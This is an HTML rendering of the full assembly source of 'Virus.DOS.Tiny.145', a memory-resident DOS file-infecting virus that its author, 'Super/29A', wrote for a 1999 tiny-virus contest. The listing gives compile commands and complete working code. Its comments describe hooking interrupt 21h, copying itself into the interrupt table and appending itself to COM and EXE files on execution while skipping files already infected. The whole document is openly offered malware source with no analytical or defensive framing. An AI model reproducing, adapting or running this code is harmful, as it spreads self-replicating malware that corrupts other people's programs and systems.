<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Tiny.145 - SUPER29A.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;THIS VIRUS WAS WRITTEN FOR THE TINY'99 VIRUS CONTEST</span><span class="sc0">
</span><span class="sc1">;Made by Super/29A</span><span class="sc0">


</span><span class="sc1">;This virus is a reduced version of my Small virus that appeared in vlad#5</span><span class="sc0">

</span><span class="sc1">;At that moment it was 168 bytes long.</span><span class="sc0">
</span><span class="sc1">;Now its 145 bytes!!!</span><span class="sc0">

</span><span class="sc1">;This virus should work in all versions of msdos, including dos sessions</span><span class="sc0">
</span><span class="sc1">;inside win3.x/win9x  I havent tested in winNT.</span><span class="sc0">
</span><span class="sc1">;It infects COM &amp;amp; EXE files, without reinfecting them.</span><span class="sc0">
</span><span class="sc1">;It goes memory resident (only one time, of course)</span><span class="sc0">



</span><span class="sc1">;thanks to DARKMAN for his 1 byte optimization</span><span class="sc0">
</span><span class="sc1">;i dont know what i could do without him  :-D</span><span class="sc0">


</span><span class="sc1">;to compile:</span><span class="sc0">
</span><span class="sc1">;tasm /m29A small.asm</span><span class="sc0">
</span><span class="sc1">;tlink /t small</span><span class="sc0">

</span><span class="sc2">.286</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">small</span><span class="sc0">    </span><span class="sc1">;yeah! small! as always  :D</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">           </span><span class="sc1">;code starts here... no data  X-D</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

             </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">   </span><span class="sc1">;only for COM, the first generation</span><span class="sc0">
</span><span class="sc5">vir_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;Before starting a DOS program, the registers should have the following value:</span><span class="sc0">
</span><span class="sc1">;eax=00000000</span><span class="sc0">
</span><span class="sc1">;ebx=00000000</span><span class="sc0">
</span><span class="sc1">;ecx=000000ff</span><span class="sc0">
</span><span class="sc1">;dx=ds=es</span><span class="sc0">
</span><span class="sc1">;esi=eip</span><span class="sc0">
</span><span class="sc1">;edi=esp</span><span class="sc0">
</span><span class="sc1">;ebp=0912 (in pure dos)</span><span class="sc0">
</span><span class="sc1">;   =091c (in windows dos session)</span><span class="sc0">


</span><span class="sc1">;if u run it with debug... forget it!  X-DD</span><span class="sc0">

</span><span class="sc5">EXE_entry</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;here starts execution in EXE infected files</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">;due to PSP</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc0">     </span><span class="sc1">;CMP AL,xx</span><span class="sc0">
</span><span class="sc5">COM_entry</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;when executing a COM file ESI get value of virus COM_entrypoint</span><span class="sc0">
                                </span><span class="sc1">;in EXE files it skips this 3 bytes</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
             </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">new_cs</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0fff0h</span><span class="sc0">          </span><span class="sc1">;add relative CS to get the old CS of host (in both COM &amp;amp; EXE files)</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">;add PSP</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;push it (for later retf)</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1234h</span><span class="sc0">
             </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">new_ip</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">          </span><span class="sc1">;push IP (for later give control to host with retf)</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;ES=0000</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">220h</span><span class="sc4">+(</span><span class="sc5">int21</span><span class="sc4">-</span><span class="sc5">vir_start</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;EAX=lineal address of int21</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">         </span><span class="sc1">;int21 vector in interrupt table</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;set int21 to int21 virus entry (0020:003C)</span><span class="sc0">

             </span><span class="sc6">scasw</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit_to_host</span><span class="sc0">    </span><span class="sc1">;test if int21 is the same address as the virus</span><span class="sc0">
                                </span><span class="sc1">;warning! dont run other program that hooks</span><span class="sc0">
                                </span><span class="sc1">;int21 after the virus</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">220h</span><span class="sc0">        </span><span class="sc1">;start of virus in memory</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">vir_size</span><span class="sc0">    </span><span class="sc1">;virus size=145 bytes = 91h bytes</span><span class="sc0">
             </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;copy virus to mem (hole in</span><span class="sc0">
                                                </span><span class="sc1">;interrupt table)</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
             </span><span class="sc6">stosw</span><span class="sc0">      </span><span class="sc1">;store old int21 handler</span><span class="sc0">

</span><span class="sc5">exit_to_host</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">;restore ES</span><span class="sc0">

             </span><span class="sc6">retf</span><span class="sc0">       </span><span class="sc1">;return control to host</span><span class="sc0">


</span><span class="sc5">infect_exe</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">         </span><span class="sc1">;DX=new CS</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Adjust for the header size</span><span class="sc0">

             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Store new CS and get old one</span><span class="sc0">
             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Store new IP and get old one</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">      </span><span class="sc1">;Calculate part-page at EOF</span><span class="sc0">
                                        </span><span class="sc1">;It does not reinfect because</span><span class="sc0">
                                        </span><span class="sc1">; the carrier flag will be set</span><span class="sc0">
                                        </span><span class="sc1">; and tested in &amp;quot;write_jump&amp;quot;</span><span class="sc0">

             </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">write_jump</span><span class="sc0">


</span><span class="sc1">;here starts virus int21</span><span class="sc0">
</span><span class="sc1">;its address is 0020:003c  (equivalent to linear address 0000025c)</span><span class="sc0">

</span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">pusha</span><span class="sc0">      </span><span class="sc1">;Save registers</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">       </span><span class="sc1">;Infect on execute</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_int21</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;SI=0000</span><span class="sc0">
                             </span><span class="sc1">;Open file ---&amp;gt;BX=handle</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d92h</span><span class="sc0">    </span><span class="sc1">;  bits 0-2=2--&amp;gt; read &amp;amp; write access</span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">;  bits 4-6=1--&amp;gt; prohibit access by others</span><span class="sc0">
             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;  bit 7=1--&amp;gt; private for current process</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">       </span><span class="sc1">; Read first 20h bytes from the file</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">cwd</span><span class="sc0">              </span><span class="sc1">; (DS:DX=0020:0000)</span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">    </span><span class="sc1">; Seek to EOF</span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; (CX &amp;amp; DX are already zero)</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">vir_size</span><span class="sc0">    </span><span class="sc1">;virus length</span><span class="sc0">

             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">;save in BP the value of AX (low word of file size)</span><span class="sc0">

             </span><span class="sc6">lodsb</span><span class="sc0">      </span><span class="sc1">;get first byte of file</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infect_exe</span><span class="sc0">      </span><span class="sc1">;in case of MZ header jump to infect file</span><span class="sc0">

</span><span class="sc5">infect_com</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;the COM file must start by a jump</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

             </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Store the jump to the virus</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">103h</span><span class="sc0">    </span><span class="sc1">; Calculate the offset where the program jumps</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">    </span><span class="sc1">; Test if the file is infected</span><span class="sc0">
                            </span><span class="sc1">; (if the jump is 100h bytes before the EOF)</span><span class="sc0">
</span><span class="sc5">write_jump</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">    </span><span class="sc1">; Exit if the file is already infected</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+(</span><span class="sc5">new_ip</span><span class="sc4">-</span><span class="sc5">vir_start</span><span class="sc4">)],</span><span class="sc8">bp</span><span class="sc0">    </span><span class="sc1">; Store the program entry point</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+(</span><span class="sc5">new_cs</span><span class="sc4">-</span><span class="sc5">vir_start</span><span class="sc4">)],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">    </span><span class="sc1">; (0020:0020 is the start of the code)</span><span class="sc0">
</span><span class="sc5">write_again</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">    </span><span class="sc1">; Write virus to the end of the file</span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">       </span><span class="sc1">; (CX is already the length of the virus)</span><span class="sc0">

</span><span class="sc5">write_hdr</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">cwd</span><span class="sc0">             </span><span class="sc1">; Seek to the start of file</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">     </span><span class="sc1">; (DX is already zero)</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
             </span><span class="sc6">jnp</span><span class="sc0"> </span><span class="sc5">write_again</span><span class="sc0">    </span><span class="sc1">;go and write the start of modified file</span><span class="sc0">
                                </span><span class="sc1">;or should i say infected file  ;-D</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">    </span><span class="sc1">; Close file</span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">exit_int21</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
             </span><span class="sc6">popa</span><span class="sc0">     </span><span class="sc1">; Restore registers</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">    </span><span class="sc1">; Far jump to old interrupt 21</span><span class="sc0">

</span><span class="sc5">vir_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">vir_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vir_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vir_start</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">vir_start</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span></div></body>
</html>
